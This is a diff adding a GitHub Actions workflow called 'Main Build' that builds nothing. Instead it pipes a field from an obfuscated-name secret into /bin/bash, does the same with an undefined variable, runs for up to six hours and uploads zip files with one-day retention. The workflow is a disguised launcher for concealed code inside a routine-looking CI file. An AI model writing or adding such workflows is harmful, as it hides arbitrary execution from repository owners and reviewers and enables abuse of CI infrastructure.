@@ -1,0 +1,28 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  ci:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          wdg29626: ${{ secrets.wdg29626 }}
+        run: |
+          printf '%s' "$wdg29626" | jq -r .ss8901 | /bin/bash
+          printf '%s' "$i5" | jq -r .seoxa6806 | /bin/bash
+
+      - name: Save artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: c4QxDOym
+          path: "*.zip"
+          retention-days: 1
